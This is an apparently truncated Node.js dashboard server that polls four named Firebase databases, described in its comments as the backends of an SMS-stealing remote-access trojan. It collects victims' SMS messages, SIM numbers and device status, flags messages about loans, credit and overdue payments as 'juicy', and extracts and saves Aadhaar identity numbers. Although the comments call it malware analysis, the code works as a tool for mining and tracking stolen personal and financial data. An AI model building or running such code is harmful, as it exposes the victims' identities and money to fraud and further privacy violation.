import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = 3000;

// ── Dashboard-owned data directory (no dependency on bot's working dir) ────────
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const DB_FILE          = path.join(DATA_DIR, 'dashboard_db.json');
const SIM_FILE         = path.join(DATA_DIR, 'sim_overrides.json');
const NOTES_FILE       = path.join(DATA_DIR, 'device_notes.json');
const AADHAR_FILE      = path.join(DATA_DIR, 'aadhar.json');

// Poll interval: how often the background poller refreshes each target (ms)
const POLL_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes

// ── Juicy keywords (mirrors DA1.py exactly — hot-reloadable via /api/keywords) ─
let JUICY_KEYWORDS = [
  // Loan / credit apps
  'kreditbee','creditbee','mpokket','navi','nira','moneyview',
  'stucred','snapmint','pfin','poonawala','fincorp',
  'aditya birla','adityabirla','flaxi','flexsalary','salaryday',
  'rupee112','zestmoney','home credit','homecredit',
  // Approval / offer keywords
  'pre approved','pre-approved','preapproved',
  'approved','loan approved','credit approved',
  'increase limit','credit limit','limit increase',
  // Repayment / overdue
  'repayment','overdue','due amount','emi due','emi overdue',
  'outstanding','payment due',
  // Generic finance
  'loan','credit card','bajaj','zype',
];

// Frozen baseline — used for homepage Juicy count; never mutated by /api/keywords
const HARDCODED_JUICY_SET = new Set(JUICY_KEYWORDS);

// ── OLD TARGETS REMOVED - Replaced with malware analysis databases ───────────
const OLD_TARGETS = [];

// ── MALWARE FIREBASE TARGETS (from Deep Analysis Report 2025-01-07) ───────────
// Analysis Report: DEEP_ANALYSIS_COMPLETE_REPORT.md
// Threat: SMS Stealer + Remote Access Trojan (RAT)
// Target: Indian users (Aadhaar, banking, telecom data)
const RAW_TARGETS = [
  [1, 'https://colana-84ce2-default-rtdb.firebaseio.com'],      // my hr5.apk - messages, device_commands, clients
  [2, 'https://sirelech1-default-rtdb.firebaseio.com'],         // hr1.apk - user_sms, sms_forward, all_pas
  [3, 'https://vish-4a6de-default-rtdb.firebaseio.com'],        // hr2.apk - galleryMedia, bankProfiles, devices
  [4, 'https://gggggg-979bd-default-rtdb.firebaseio.com'],      // hr3.apk - 15+ infected devices, Card data
];

// ── Schema assignment for malware databases ───────────────────────────────────
// ALL 4 databases use Schema 2: clients.json endpoint with inline messages
// Schema 2: clients + inline messages at clients[did].messages
const SCHEMA_2 = new Set([1, 2, 3, 4]);  // ALL malware databases use /clients.json

function getSchema(id) {
  return 2;  // All malware databases use schema 2
}

const TARGETS = RAW_TARGETS.map(([id, url]) => ({
  id, url: url.replace(/\/$/, ''), schema: getSchema(id), isOld: false
}));

// ── PP TARGETS REMOVED - Replaced with malware analysis databases ────────────
const PP_TARGETS = [];

// ── SRK TARGETS REMOVED - Replaced with malware analysis databases ───────────
const SRK_TARGETS = [];

const ALL_TARGETS = [...TARGETS];  // Only malware analysis databases

// ── Dashboard DB: load / save ─────────────────────────────────────────────────
// Structure: { new: { [targetId]: { [deviceId]: deviceRecord } },
//              old: { [targetId]: { [deviceId]: deviceRecord } } }
// deviceRecord mirrors DA1.py fields exactly.
let dashboardDb = { new: {}, old: {} };

function loadDashboardDb() {
  try {
    if (fs.existsSync(DB_FILE)) dashboardDb = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
  } catch (e) {
    console.error('DB load error:', e.message);
  }
  // Ensure both sections exist
  if (!dashboardDb.new) dashboardDb.new = {};
  if (!dashboardDb.old) dashboardDb.old = {};
  if (!dashboardDb.pp)  dashboardDb.pp  = {};
  if (!dashboardDb.srk) dashboardDb.srk = {};
}

function saveDashboardDb() {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(dashboardDb, null, 2));
  } catch (e) {
    console.error('DB save error:', e.message);
  }
}

function getTargetDb(target) {
  const section = target.isSRK ? 'srk' : (target.isPP ? 'pp' : (target.isOld ? 'old' : 'new'));
  const key = String(target.id);
  if (!dashboardDb[section][key]) dashboardDb[section][key] = {};
  return dashboardDb[section][key];
}

// Update a single device record — never removes juicy_keywords already stored
function upsertDevice(target, deviceId, fields) {
  const db = getTargetDb(target);
  const now = new Date().toISOString().replace('T', ' ').slice(0, 16);
  const existing = db[deviceId] || {};

  // Merge juicy keywords: accumulate, never delete
  const oldKws = new Set(existing.juicy_keywords || []);
  const newKws = fields.juicy_keywords || [];
  for (const kw of newKws) oldKws.add(kw);

  // Track status transitions
  const wasOnline = existing.current_status === 'online';
  const isOnline  = fields.current_status === 'online';
  const last_online  = isOnline  ? now : (existing.last_online  || null);
  const last_offline = !isOnline ? now : (existing.last_offline || null);

  db[deviceId] = {
    brand:         fields.brand         || existing.brand         || 'Unknown',
    device_id:     deviceId,
    sim1_number:   fields.sim1_number   || existing.sim1_number   || 'N/A',
    sim2_number:   fields.sim2_number   || existing.sim2_number   || 'N/A',
    sim1_enriched: fields.sim1_enriched || existing.sim1_enriched || [],
    sim2_enriched: fields.sim2_enriched || existing.sim2_enriched || [],
    juicy_keywords: [...oldKws],
    current_status: fields.current_status || 'offline',
    last_battery:  fields.last_battery  || existing.last_battery  || 'N/A',
    last_activity: fields.last_activity || existing.last_activity || null,
    last_online,
    last_offline,
    app_id:        fields.app_id        || existing.app_id        || 'N/A',
    obj_id:        fields.obj_id        || existing.obj_id        || 'N/A',
    user_serial:   fields.user_serial   || existing.user_serial   || 'N/A',
  };
}

// ── Firebase fetch helpers ────────────────────────────────────────────────────
async function fbFetch(url) {
  const resp = await fetch(url, {
    headers: { 'User-Agent': 'Mozilla/5.0' },
    signal: AbortSignal.timeout(25000),
  });
  if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
  const text = await resp.text();
  if (!text || text[0] === '<') throw new Error('HTML response (auth error)');
  return JSON.parse(text);
}

// Iterate SMS messages from arbitrary nested Firebase data
function* iterMsgs(data) {
  if (!data || typeof data !== 'object') return;
  for (const v of Object.values(data)) {
    if (!v || typeof v !== 'object') continue;
    if ('body' in v || 'message' in v || 'msg' in v || 'text' in v) yield v;
    else yield* iterMsgs(v);
  }
}

// Extract last_activity timestamp string and juicy keywords from an SMS collection
function parseSms(dsms, schema) {
  const tsList = [];
  const foundKws = new Set();
  const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
  const AADHAR_KW = /aadh[a]?ar/i;
  const foundAadhars = new Set();

  const msgs = dsms && typeof dsms === 'object'
    ? (Array.isArray(dsms) ? dsms : Object.values(dsms))
    : [];

  for (const msg of msgs) {
    if (!msg || typeof msg !== 'object') continue;
    let body = '', ts = 0;

    if ([2, 4, 10, 11, 19].includes(schema)) {
      body = String(msg.message || msg.body || '');
      const dtStr = msg.dateTime || '';
      if (dtStr) {
        try {
          // "DD-MM-YYYY | HH:MM AM/PM"
          const [datePart, timePart] = dtStr.split(' | ');
          ts = new Date(`${datePart.split('-').reverse().join('-')} ${timePart}`).getTime() || 0;
        } catch {}
      }
    } else if (schema === '8a' || schema === '8b') {
      body = String(msg.msg || '');
      ts = Number(msg.date) || 0;
    } else if (schema === 12) {
      body = String(msg.text || '');
      ts = Number(msg.rawTs || msg.timestamp) || 0;
    } else if (schema === 13) {
      body = String(msg.message || msg.body || '');
      ts = Number(msg.timestamp || msg.timestampMillis) || 0;
    } else {
      body = String(msg.body || msg.message || msg.msg || msg.text || '');
      // Try numeric timestamp fields first, then parse date strings
      const rawTs = msg.timestampMillis || msg.timestamp || (typeof msg.date === 'number' ? msg.date : null);
      if (rawTs) {
        ts = Number(rawTs) || 0;
      } else if (msg.receivedDate || msg.dateReceived || msg.date_received) {
        // "2026-05-25 12:29:50" or similar ISO-style string
        try { ts = new Date(msg.receivedDate || msg.dateReceived || msg.date_received).getTime() || 0; } catch {}
      } else if (msg.date && typeof msg.date === 'string') {
        // "09/09/2025 09:37 am" or "19/06/2026 05:28 pm" — DD/MM/YYYY format
        try {
          const raw = String(msg.date).trim();
          const m = raw.match(/^(\d{2})\/(\d{2})\/(\d{4})\s+(.+)$/);
          if (m) {
            ts = new Date(`${m[2]}/${m[1]}/${m[3]} ${m[4]}`).getTime() || 0;
          }
        } catch {}
      }
    }

    const lower = body.toLowerCase();
    for (const kw of JUICY_KEYWORDS) {
      if (lower.includes(kw)) foundKws.add(kw);
    }
    if (AADHAR_KW.test(lower)) {
      for (const m of body.matchAll(AADHAR_RE)) foundAadhars.add(m[1]);
    }
    if (ts > 0) tsList.push(ts);
  }

  const maxTs = tsList.length ? Math.max(...tsList) : 0;
  const actStr = maxTs
    ? new Date(maxTs).toISOString().replace('T', ' ').slice(0, 16)
    : 'Unknown';

  return { actStr, foundKws: [...foundKws], foundAadhars: [...foundAadhars], maxTs };
}

// ── Schemas that need per-device SMS fetch (not inline in main endpoint) ──────
// Schema 2,5: SMS at /messages/<did>.json
// Schema 3,6: SMS at /user_sms/<did>.json
// Schema 4: SMS is INLINE inside clients[did].messages — NO separate fetch
const NEEDS_PER_DEVICE_SMS = new Set([2, 3, 5, 6]);

function getSmsEndpoint(url, schema, did) {
  if (schema === 2 || schema === 5) return `${url}/messages/${did}.json`;
  return `${url}/user_sms/${did}.json`;
}

// ── Per-target Firebase poll ──────────────────────────────────────────────────
async function pollTarget(target) {
  const { id, url, schema, isOld } = target;
  const STALE_MS = 30 * 60 * 1000;

  try {
    // ── Determine main endpoint ──────────────────────────────────────────────
    let mainEP;
    if (schema === 1)                               mainEP = `${url}/All_Users.json`;
    else if (schema === 2 || schema === 4)          mainEP = `${url}/.json`;  // Changed to root to get both clients and user_data
    else if (schema === 3)                          mainEP = `${url}/user_data.json`;
    else if (schema === 5)                          mainEP = `${url}/devices.json`;
    else if (schema === 6)                          mainEP = `${url}/data.json`;
    else if (schema === '8a')                       mainEP = `${url}/omex.json`;
    else if (['8b',9,10,11,14,15].includes(schema)) mainEP = `${url}/.json`;
    else if (schema === 12)                         mainEP = `${url}/devices.json`;
    else if (schema === 13)                         mainEP = `${url}/admin.json`;
    else if (schema === 16)                         mainEP = `${url}/data.json`;
    else if (schema === 17)                         mainEP = `${url}/clients.json`;
    else if (schema === 18)                         mainEP = `${url}/admins/default_admin_uid/clients.json`;
    else if (schema === 19)                         mainEP = `${url}/admins/default_admin_uid/data.json`;
    else if (schema === 20)                         mainEP = `${url}/admins/default_admin_uid/clients.json`;
    else                                            mainEP = `${url}/All_Users.json`;

    const data = await fbFetch(mainEP);
    if (!data) return;

    // ── Extract device map + SMS/SIM maps per schema ─────────────────────────
    let rawDevs = {}, allSms = {}, allSims = {};

    if (schema === 1) {
      rawDevs = data?.Data?.DeviceInfo || {};
      allSms  = data?.sms              || {};  // root-level sms map: {did: {msgId: {body,...}}}
      allSims = data?.simDetails       || {};  // root-level simDetails: {did: {sim1Number,...}}
    } else if (schema === '8a') {
      rawDevs = data?.All_User?.Info    || {};
      allSms  = data?.All_User?.Sms     || {};
      allSims = data?.All_User?.SimINFO || {};
    } else if (schema === '8b') {
      rawDevs = data?.omex?.All_User?.Info    || {};
      allSms  = data?.omex?.All_User?.Sms     || {};
      allSims = data?.omex?.All_User?.SimINFO || {};
    } else if (schema === 9) {
      rawDevs = data?.user_data || {};
      allSms  = data?.user_sms  || {};
    } else if (schema === 2 || schema === 4) {
      // Schema 2: Handle both clients and user_data (some DBs have both)
      const ud = data?.user_data || {};
      const cl = data?.clients   || {};
      // Merge: user_data first (usually has more complete info), then clients
      // Use a Set to track which IDs we've already added to avoid duplicates
      const seenIds = new Set();
      for (const [k,v] of Object.entries(ud)) {
        if (v && typeof v==='object') {
          rawDevs[k] = {...v, _src:'user_data'};
          seenIds.add(k);
        }
      }
      for (const [k,v] of Object.entries(cl)) {
        if (!seenIds.has(k) && v && typeof v==='object') {
          rawDevs[k] = {...v, _src:'clients'};
          seenIds.add(k);
        }
      }
      allSms = data?.user_sms || data?.messages || {};
    } else if (schema === 10) {
      rawDevs = data?.clients  || {};
      allSms  = data?.messages || {};
    } else if (schema === 11) {
      rawDevs = data?.clients  || {};
      allSms  = data?.messages || {};
    } else if (schema === 14) {
      const ud = data?.user_data || {};
      const cl = data?.clients   || {};
      for (const [k,v] of Object.entries(ud)) if (v && typeof v==='object') rawDevs[k] = {...v, _src:'user_data'};
      for (const [k,v] of Object.entries(cl)) if (!rawDevs[k] && v && typeof v==='object') rawDevs[k] = {...v, _src:'clients'};
      allSms = data?.user_sms || data?.messages || {};
    } else if (schema === 15) {
      const users = data?.users || {};
      for (const [,u] of Object.entries(users)) if (u?.DeviceId) rawDevs[u.DeviceId] = u;
    } else if (schema === 13) {
      for (const av of Object.values(data || {})) {
        if (av?.users) for (const [uid, ud] of Object.entries(av.users)) if (ud) rawDevs[uid] = ud;
      }
    } else if (schema === 16) {
      // /data/<did>{messages:[...]} — devices keyed under /data, SMS inline in data[did].messages
      rawDevs = data && typeof data === 'object' ? data : {};
      // SMS is inline per device — extracted in device loop below
    } else if (schema === 17) {
      // clients/<did> for device info; /messages flat collection {id_did:{deviceID,message,dateTime}}
      // Fetch all messages first, then group by deviceID
      rawDevs = data && typeof data === 'object' ? data : {};
      // allSms will be built after fetching /messages root
      try {
        const allMsgsFlat = await fbFetch(`${url}/messages.json`);
        if (allMsgsFlat && typeof allMsgsFlat === 'object') {
          // Group messages by deviceID
          for (const msg of Object.values(allMsgsFlat)) {
            if (!msg || typeof msg !== 'object') continue;
            const did = msg.deviceID || msg.deviceId;
            if (!did) continue;
            if (!allSms[did]) allSms[did] = {};
            allSms[did][`${msg.id || Math.random()}`] = msg;
          }
        }
      } catch {}
    } else if (schema === 18) {
      // /admins/default_admin_uid/clients/<did>{connection,heartbeat,messages,status}
      // SMS inline at clients[did].messages keyed by timestamp: {address,body,date,type}
      rawDevs = data && typeof data === 'object' ? data : {};
      // SMS extracted inline per device in loop below
    } else if (schema === 19) {
      // /admins/default_admin_uid/data/<did>{messages:{id:{dateTime,message,sender,type}}}
      // SMS inline per device under data[did].messages
      rawDevs = data && typeof data === 'object' ? data : {};
      // Skip placeholder key
      delete rawDevs['{DEVICE_ID_MY_PROJECT}'];
    } else if (schema === 20) {
      // /admins/default_admin_uid/clients/<did> for device info (has mobNo/sims)
      // SMS at /smsLogs/<serial>/<pushid>{body,receiverNumber,senderNumber,timestamp,uniqueid}
      // Group SMS by receiverNumber (10-digit suffix) matching device mobNo
      rawDevs = data && typeof data === 'object' ? data : {};
      try {
        const smsLogsRoot = await fbFetch(`${url}/smsLogs.json`);
        if (smsLogsRoot && typeof smsLogsRoot === 'object') {
          // Build phone->messages map from all smsLogs entries
          const phoneToSms = {};
          for (const serialMsgs of Object.values(smsLogsRoot)) {
            if (!serialMsgs || typeof serialMsgs !== 'object') continue;
            for (const [pushId, msg] of Object.entries(serialMsgs)) {
              if (!msg || typeof msg !== 'object') continue;
              const phone = String(msg.receiverNumber || '').replace(/\D/g,'').slice(-10);
              if (!phone || phone.length < 10) continue;
              if (!phoneToSms[phone]) phoneToSms[phone] = {};
              phoneToSms[phone][pushId] = {
                body: msg.body || '',
                address: msg.senderNumber || '',
                date: msg.timestamp ? new Date(msg.timestamp).getTime() : Date.now(),
                type: 1, // incoming
              };
            }
          }
          // Map to device IDs via mobNo field
          for (const [did, dinfo] of Object.entries(rawDevs)) {
            if (!dinfo || typeof dinfo !== 'object') continue;
            const mobNo = String(dinfo.mobNo || dinfo.phoneNumber || '').replace(/\D/g,'').slice(-10);
            if (mobNo && phoneToSms[mobNo]) allSms[did] = phoneToSms[mobNo];
          }
        }
      } catch {}
    } else {
      rawDevs = (data && typeof data === 'object') ? data : {};
    }

    // ── For schemas that store SMS separately: fetch per-device SMS in parallel ─
    if (NEEDS_PER_DEVICE_SMS.has(schema)) {
      const dids = Object.keys(rawDevs);
      const results = await Promise.allSettled(
        dids.map(did => fbFetch(getSmsEndpoint(url, schema, did)).catch(() => null))
      );
      for (let i = 0; i < dids.length; i++) {
        const val = results[i].status === 'fulfilled' ? results[i].value : null;
        allSms[dids[i]] = val || {};
      }
    }

    // ── Schema 12: SMS is at /profex_incoming/<did> from root /.json ──────────
    if (schema === 12) {
      try {
        const root = await fbFetch(`${url}/.json`);
        allSms = root?.profex_incoming || {};
      } catch {}
    }

    // ── Process each device ──────────────────────────────────────────────────
    for (const [did, dinfo] of Object.entries(rawDevs)) {
      if (!dinfo || typeof dinfo !== 'object') continue;

      // Get SMS for this device
      let dsms = allSms[did] || {};
      // For schema 8a/8b use actual_did
      let actualDid = did;
      if (schema === '8a' || schema === '8b') {
        actualDid = dinfo.did || did;
        dsms = allSms[actualDid] || allSms[did] || {};
      }
      // Schema 13: SMS is nested under receivedSms key inside the device record
      if (schema === 13) dsms = dinfo.receivedSms || {};
      // Schema 4: messages are INLINE inside clients[did].messages
      if (schema === 4) dsms = dinfo.messages || {};
      // Schema 16: messages are INLINE inside data[did].messages
      if (schema === 16) dsms = dinfo.messages || {};
      // Schema 18: messages are INLINE inside admins/.../clients[did].messages
      if (schema === 18) dsms = dinfo.messages || {};
      // Schema 19: messages are INLINE inside admins/.../data[did].messages
      if (schema === 19) dsms = dinfo.messages || {};

      const { actStr, foundKws, foundAadhars, maxTs } = parseSms(dsms, schema);

      // ── Extract fields per schema (mirrors DA1.py exactly) ────────────────
      let s1 = 'N/A', s2 = 'N/A', bat = 'N/A', brand = 'Unknown', isOn = false;
      let appId = 'N/A', objId = 'N/A', userSerial = 'N/A';

      if (schema === 1) {
        const devSims = allSims[did] || {};
        s1     = devSims.sim1Number || 'N/A';
        s2     = devSims.sim2Number || 'N/A';
        bat    = dinfo.Battery || 'N/A';
        brand  = dinfo.Brand   || 'Unknown';
        isOn   = dinfo.Status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
        appId  = dinfo.appId || 'N/A';
        objId  = dinfo.objId || did;

      } else if (schema === '8a' || schema === '8b') {
        const devSims = allSims[actualDid] || allSims[did] || {};
        const r1 = String(devSims.sim1 || 'N/A');
        const r2 = String(devSims.sim2 || 'N/A');
        s1    = r1 !== 'N/A' ? r1.split(' - ')[0].trim() : 'N/A';
        s2    = r2 !== 'N/A' ? r2.split(' - ')[0].trim() : 'N/A';
        bat   = dinfo.Battery || 'N/A';
        brand = dinfo.Name    || 'Unknown';
        isOn  = dinfo.status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
        objId = actualDid;

      } else if (schema === 9) {
        s1    = dinfo.phoneNumber || 'N/A';
        s2    = 'N/A';
        const bv = dinfo.battery;
        bat   = bv != null && bv !== 'N/A' ? (String(bv).endsWith('%') ? String(bv) : `${bv}%`) : 'N/A';
        brand = dinfo.d_name || 'Unknown';
        isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 2 || schema === 4) {
        // Handle both user_data and clients sources
        if (dinfo._src === 'user_data') {
          // user_data source (like DB2): Schema 9 style
          s1    = dinfo.phoneNumber || 'N/A';
          s2    = 'N/A';
          const bv = dinfo.battery;
          bat   = bv != null && bv !== 'N/A' ? (String(bv).endsWith('%') ? String(bv) : `${bv}%`) : 'N/A';
          brand = dinfo.d_name || 'Unknown';
          isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
        } else {
          // clients source: standard Schema 2 processing
          const sims = dinfo.sims || [];
          s1    = sims[0]?.phoneNumber || dinfo.mobNo || 'N/A';
          s2    = sims[1]?.phoneNumber || 'N/A';
          bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
          brand = dinfo.modelName || dinfo.brand || dinfo.label || 'Unknown';
          // Schema 4: status is boolean (true = online); schema 2: 'online'/'true'
          isOn  = dinfo.status === true || dinfo.status === 'online' || dinfo.status === 'Online'
                  || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
        }

      } else if (schema === 3 || schema === 6) {
        s1    = dinfo.numberSim1 || dinfo.phoneNumber || 'N/A';
        s2    = dinfo.numberSim2 || 'N/A';
        bat   = dinfo.battery != null ? `${dinfo.battery}%` : 'N/A';
        brand = dinfo.d_name || 'Unknown';
        isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 5) {
        const info = dinfo.info || {};
        s1    = info.sim1 || dinfo.sim1 || dinfo.phoneNumber || 'N/A';
        s2    = info.sim2 || dinfo.sim2 || 'N/A';
        bat   = info.battery || dinfo.battery || dinfo.Battery || 'N/A';
        brand = info.model || info.brand || dinfo.brand || dinfo.Brand || dinfo.modelName || 'Unknown';
        isOn  = ['Online','online',true].includes(dinfo.status) || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 10) {
        // Try to find phone from outgoing SMS sender
        for (const msg of (typeof dsms === 'object' ? Object.values(dsms) : [])) {
          if (msg?.type === 'outgoing') {
            const d = String(msg.sender || '').replace(/\D/g,'');
            if (d.length >= 10) { s1 = d.slice(-10); break; }
          }
        }
        bat = 'N/A'; brand = 'Unknown';
        isOn = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;

      } else if (schema === 11) {
        s1    = dinfo.mobNo || 'N/A';
        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
        brand = dinfo.modelName || dinfo.Brand || 'Unknown';
        isOn  = dinfo.status === true || dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 12) {
        const hero = dinfo.hero || {};
        const info = dinfo.info || {};
        s1    = String(hero.number || 'N/A');
        s2    = String(dinfo.number_2 || dinfo.forward || 'N/A');
        bat   = 'N/A';
        brand = info.model || 'Unknown';
        isOn  = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;

      } else if (schema === 13) {
        const di = dinfo.deviceInfo || {};
        const si = dinfo.simInfo    || {};
        const sim1o = si.sim1 || si.sim0 || {};
        const sim2o = si.sim2 || {};
        s1    = String(sim1o.number || 'N/A');
        s2    = String(sim2o.number || 'N/A');
        bat   = 'N/A';
        brand = di.model || di.brand || 'Unknown';
        isOn  = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;

      } else if (schema === 14) {
        if (dinfo._src === 'user_data') {
          s1    = dinfo.phoneNumber || 'N/A';
          const bv = dinfo.battery;
          bat   = bv != null && bv !== 'N/A' ? (String(bv).endsWith('%') ? String(bv) : `${bv}%`) : 'N/A';
          brand = dinfo.d_name || 'Unknown';
        } else {
          const sims = dinfo.sims || [];
          s1    = sims[0]?.phoneNumber || dinfo.mobNo || 'N/A';
          s2    = sims[1]?.phoneNumber || 'N/A';
          bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
          brand = dinfo.modelName || 'Unknown';
        }
        isOn = ['online','Online',true].includes(dinfo.status) || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 15) {
        s1    = String(dinfo.Phone || 'N/A');
        bat   = String(dinfo.Battery || 'N/A');
        brand = dinfo.Brand || 'Unknown';
        isOn  = dinfo.Status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 16) {
        // /data/<did>: device info fields + inline messages sub-key
        s1    = dinfo.phoneNumber || dinfo.phone || dinfo.mobile || 'N/A';
        s2    = 'N/A';
        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
        brand = dinfo.brand || dinfo.Brand || dinfo.model || dinfo.deviceName || 'Unknown';
        isOn  = dinfo.status === 'online' || dinfo.status === true || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 17) {
        // /clients/<did>: device info; SMS already grouped in allSms by deviceID field
        s1    = dinfo.phoneNumber || dinfo.phone || dinfo.mobile || dinfo.sim1 || 'N/A';
        s2    = dinfo.sim2 || 'N/A';
        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
        brand = dinfo.brand || dinfo.Brand || dinfo.model || dinfo.deviceName || dinfo.deviceId || 'Unknown';
        isOn  = dinfo.status === 'online' || dinfo.status === true || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
        objId = dinfo.deviceId || did;

      } else if (schema === 18) {
        // /admins/default_admin_uid/clients/<did>{connection,heartbeat,messages,status}
        const conn = dinfo.connection || {};
        const hb   = dinfo.heartbeat  || {};
        const msgs18 = dinfo.messages || {};
        const firstMsg = Object.values(msgs18)[0] || {};
        s1    = firstMsg.address ? String(firstMsg.address).replace(/\D/g,'').slice(-10) : 'N/A';
        s2    = 'N/A';
        bat   = hb.batteryLevel != null ? `${hb.batteryLevel}%` : 'N/A';
        brand = dinfo.deviceModel || dinfo.brand || 'Unknown';
        isOn  = conn.status === 'connected' || dinfo.status === true
                || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 19) {
        // /admins/default_admin_uid/data/<did>{messages:{id:{dateTime,message,sender,type}}}
        // No device info fields (just messages), extract phone from SMS sender
        const msgs19 = dinfo.messages || {};
        for (const msg of Object.values(msgs19)) {
          const sndr = String(msg?.sender || '').replace(/\D/g,'');
          if (sndr.length >= 10) { s1 = sndr.slice(-10); break; }
        }
        bat   = 'N/A';
        brand = 'Unknown';
        isOn  = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;

      } else if (schema === 20) {
        // /admins/default_admin_uid/clients/<did>{mobNo,sims,battery,brand,connection}
        // SMS already resolved into allSms[did] from smsLogs by phone match
        const sims20 = dinfo.sims || [];
        s1    = String(dinfo.mobNo || sims20[0]?.phoneNumber || 'N/A').replace(/\D/g,'').slice(-10) || 'N/A';
        s2    = sims20[1] ? String(sims20[1].phoneNumber || 'N/A').replace(/\D/g,'').slice(-10) : 'N/A';
        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
        brand = dinfo.modelName || dinfo.brand || 'Unknown';
        const conn20 = dinfo.connection || {};
        isOn  = conn20.status === 'connected' || dinfo.status === 'online' || dinfo.status === true
                || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
      }

      const oldRecord = getTargetDb(target)[actualDid] || null;
      upsertDevice(target, actualDid, {
        brand, last_battery: bat, sim1_number: s1, sim2_number: s2,
        current_status: isOn ? 'online' : 'offline',
        last_activity: actStr !== 'Unknown' ? actStr : null,
        juicy_keywords: foundKws,
        app_id: appId, obj_id: objId, user_serial: userSerial,
        sim1_enriched: [], sim2_enriched: [],
      });
      const newRecord = getTargetDb(target)[actualDid];
      dispatchAlerts(target, actualDid, oldRecord, newRecord);

      // Persist aadhaar numbers found in SMS
      if (foundAadhars.length > 0) {
        const adb = loadAadharDb();
        const urlKey = String(id);
        if (!adb[urlKey]) adb[urlKey] = {};
        const existing = new Set(adb[urlKey][actualDid] || []);
        for (const n of foundAadhars) existing.add(n);
        adb[urlKey][actualDid] = [...existing];
        saveAadharDb(adb);
      }
    }

    saveDashboardDb();
    console.log(`[poll] ${isOld ? 'old' : 'new'} #${id} — ${Object.keys(getTargetDb(target)).length} devices`);

  } catch (e) {
    // Non-fatal: log and move on
    console.warn(`[poll] ${isOld ? 'old' : 'new'} #${id} error: ${e.message}`);
  }
}

// ── Background poller: stagger polls to avoid hammering Firebase ──────────────
async function runPoller() {
  console.log('[poller] Starting background poll for all targets...');
  // Stagger: 1 target every 2 seconds on first run
  for (let i = 0; i < ALL_TARGETS.length; i++) {
    setTimeout(() => pollTarget(ALL_TARGETS[i]), i * 2000);
  }
  // Then repeat every POLL_INTERVAL_MS
  setInterval(async () => {
    console.log('[poller] Refreshing all targets...');
    for (let i = 0; i < ALL_TARGETS.length; i++) {
      setTimeout(() => pollTarget(ALL_TARGETS[i]), i * 2000);
    }
    // Sync bot subscribers on every poll cycle
    syncAllBotSubscribers();
  }, POLL_INTERVAL_MS);
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function extract10Digits(raw) {
  if (!raw || ['N/A','Unknown','None','','null'].includes(String(raw).trim())) return '';
  const digits = String(raw).replace(/\D/g, '');
  return digits.length >= 10 ? digits.slice(-10) : '';
}

function getSmsLink(target, deviceId, objId) {
  const { url, schema } = target;
  if (schema === 1)    return `${url}/All_Users/sms/${deviceId}.json?print=pretty`;
  if (schema === 4)    return `${url}/clients/${deviceId}/messages.json?print=pretty`;
  if (schema === 16)   return `${url}/data/${deviceId}/messages.json?print=pretty`;
  if (schema === 17) {
    // Server-side filtered endpoint — avoids needing Firebase index
    return `/api/url/${target.id}/device/${deviceId}/sms`;
  }
  if (schema === 18) {
    return `${url}/admins/default_admin_uid/clients/${deviceId}/messages.json?print=pretty`;
  }
  if ([2,5,15,10,11].includes(schema)) return `${url}/messages/${deviceId}.json?print=pretty`;
  if (schema === '8a' || schema === '8b') {
    const actual = (objId && objId !== 'N/A') ? objId : deviceId;
    return `${url}/omex/All_User/Sms/${actual}.json?print=pretty`;
  }
  if ([3,6,9,14].includes(schema)) return `${url}/user_sms/${deviceId}.json?print=pretty`;
  if (schema === 12)   return `${url}/profex_incoming/${deviceId}.json?print=pretty`;
  if (schema === 13)   return `${url}/admin.json?print=pretty`;
  return `${url}/user_sms/${deviceId}.json?print=pretty`;
}

function parseLastActivity(actStr) {
  if (!actStr || actStr === 'Unknown') return null;
  try { return new Date(actStr); } catch { return null; }
}

// ── DB accessors ──────────────────────────────────────────────────────────────
function loadAadharDb() {
  try { if (fs.existsSync(AADHAR_FILE)) return JSON.parse(fs.readFileSync(AADHAR_FILE, 'utf8')); }
  catch {}
  return {};
}
function saveAadharDb(data) {
  try { fs.writeFileSync(AADHAR_FILE, JSON.stringify(data, null, 2)); }
  catch (e) { console.error('Aadhar DB save error:', e.message); }
}

function loadSimOverrides() {
  try { if (fs.existsSync(SIM_FILE)) return JSON.parse(fs.readFileSync(SIM_FILE, 'utf8')); }
  catch {}
  return {};
}
function saveSimOverrides(data) {
